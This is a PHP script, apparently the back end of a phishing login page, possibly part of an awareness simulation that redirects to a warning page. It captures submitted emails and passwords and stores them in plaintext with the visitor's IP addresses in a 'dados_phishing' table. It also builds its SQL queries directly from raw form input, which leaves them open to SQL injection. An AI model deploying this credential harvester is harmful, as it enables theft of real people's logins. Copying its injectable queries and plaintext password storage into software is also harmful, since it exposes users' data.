<?php
 include("connection.php");
 $ip = file_get_contents("https://ipinfo.io/ip");
 $clienteIP = $_SERVER['REMOTE_ADDR'];

    if(isset($_POST["userEmail"]) && isset($_POST['userPassword'])){
    	$userMAIL = $_POST['userEmail'];
        $userPass = $_POST['userPassword'];

        if(empty($userMAIL)) {
            echo'<script>alert("Preencha seu Usuário");</script>';

        } elseif (empty($userPass)) {
            echo 'alert("Preencha sua Senha");';
        
        } else {    
            $sql_userMAIL = "SELECT * FROM dados_phishing WHERE email = '$userMAIL'";
            $sql_query = $mysqli->query($sql_userMAIL) or die("Falha na execução do código SQL: ".mysqli_error($mysqli));
            $quantidade_userMAIL = $sql_query->num_rows;

            if($quantidade_userMAIL > 0){
                $visits = $quantidade_userMAIL +1;
                $sql="INSERT INTO dados_phishing(email, password, ipInterno, ipExterno, visits) VALUES ('$userMAIL', '$userPass', '$clienteIP', '$ip', $visits)";
                
                if(mysqli_query($mysqli, $sql)) {
                    echo "Cadastrado com sucesso";
                    session_start();
                    $selectQuery = "SELECT * FROM dados_phishing WHERE visits = '$visits' AND email = '$userMAIL'";
                    $result = mysqli_query($mysqli, $selectQuery);

                    $data = mysqli_fetch_assoc($result);
                    $_SESSION["visits"] = $data["visits"];
                    $_SESSION["mail"] = $data["email"];
                    $_SESSION["passw"] = $data["password"];
                    header("Location: aviso.php");
                
                }else {
                    echo"Error". mysqli_error($mysqli);
                }

            } else {
                $sql2="INSERT INTO dados_phishing(email, password, ipInterno, ipExterno) VALUES ('$userMAIL', '$userPass', '$clienteIP', '$ip')";
                if(mysqli_query($mysqli, $sql2)) {
                    echo "Cadastrado com sucesso";
                    session_start();
                    $data = mysqli_fetch_assoc(mysqli_query($mysqli, "SELECT * FROM dados_phishing WHERE email = '$userMAIL'"));
                    $_SESSION["visits"] = $data["visits"];
                    $_SESSION["mail"] = $data["email"];
                    $_SESSION["passw"] = $data["password"];
                    header("Location: aviso.php");
                
                }else {
                    echo"Error". mysqli_error($mysqli);
                }
            
            }
        }
}
mysqli_close($mysqli);
?>